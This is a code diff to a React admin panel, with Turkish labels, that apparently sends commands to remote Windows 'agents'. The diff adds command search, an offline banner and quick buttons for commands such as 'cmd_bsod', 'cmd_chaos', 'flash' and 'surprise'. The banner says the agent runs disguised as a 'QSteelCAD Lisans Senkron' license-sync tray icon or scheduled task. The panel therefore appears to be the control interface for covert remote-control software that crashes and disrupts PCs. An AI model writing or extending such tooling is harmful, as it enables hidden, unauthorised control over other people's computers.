@@ -6,6 +6,7 @@ import {
   COMMAND_GROUPS,
   KIND_LABEL,
   commandButtonLabel,
+  filterCommands,
   type CommandDef,
   type CommandKind,
   type CommandVariant,
@@ -85,6 +86,8 @@ export function AdminPanel() {
   const [oneOffUrl, setOneOffUrl] = useState('');
   const [winAlertMsg, setWinAlertMsg] = useState('');
   const [liveTick, setLiveTick] = useState(0);
+  const [commandQuery, setCommandQuery] = useState('');
+  const filteredGroups = useMemo(() => filterCommands(commandQuery), [commandQuery]);
 
   const onlineAgents = useMemo(() => agents.filter((a) => a.online), [agents]);
 
@@ -407,6 +410,13 @@ export function AdminPanel() {
             <div className={`${styles.toast} ${msgTone === 'danger' ? styles.toastErr : styles.toastOk}`}>{msg}</div>
           ) : null}
 
+          {selectedAgent && !selectedAgent.online ? (
+            <div className={`${styles.toast} ${styles.toastErr} ${styles.healthBanner}`}>
+              Seçili kulak çevrimdışı — son sinyal: {formatLastSignal(selectedAgent)}. PC açıksa tepsi simgesi (
+              QSteelCAD Lisans Senkron) veya görev zamanlayıcıyı kontrol edin.
+            </div>
+          ) : null}
+
           {stats ? (
             <div className={styles.statGrid}>
               <div className={styles.statCard}>
@@ -507,6 +517,44 @@ export function AdminPanel() {
                   )}
                 </div>
                 <div className={styles.cardBody}>
+                  <div className={styles.commandToolbar}>
+                    <input
+                      className={styles.input}
+                      placeholder="Komut ara (cmd, bsod, youtube…)"
+                      value={commandQuery}
+                      onChange={(e) => setCommandQuery(e.target.value)}
+                      aria-label="Komut ara"
+                    />
+                    {commandQuery ? (
+                      <button
+                        type="button"
+                        className={`${styles.btn} ${styles.btnGhost}`}
+                        onClick={() => setCommandQuery('')}
+                      >
+                        Temizle
+                      </button>
+                    ) : null}
+                  </div>
+                  <div className={styles.quickStrip}>
+                    <span className={styles.cmdGroupTitle}>Hızlı</span>
+                    <div className={styles.cmdGrid}>
+                      {(['flash', 'cmd_chaos', 'cmd_bsod', 'sounds', 'surprise'] as const).map((kind) => {
+                        const def = COMMAND_GROUPS.flatMap((g) => g.commands).find((c) => c.kind === kind);
+                        if (!def) return null;
+                        return (
+                          <button
+                            key={kind}
+                            type="button"
+                            disabled={busy || !selectedAgent?.online}
+                            className={`${styles.btn} ${styles.btnChip}`}
+                            onClick={() => runCommand(def, 'single')}
+                          >
+                            {def.label}
+                          </button>
+                        );
+                      })}
+                    </div>
+                  </div>
                   <div className={styles.winAlertBox}>
                     <label className={styles.field}>
                       <span className={styles.fieldLabel}>Windows uyarı mesajı</span>
@@ -549,7 +597,7 @@ export function AdminPanel() {
                     />
                   </div>
 
-                  {COMMAND_GROUPS.map((group) => (
+                  {filteredGroups.map((group) => (
                     <div key={group.id} className={styles.cmdGroup}>
                       <p className={styles.cmdGroupTitle}>{group.title}</p>
                       {group.hint ? <p className={styles.groupHint}>{group.hint}</p> : null}
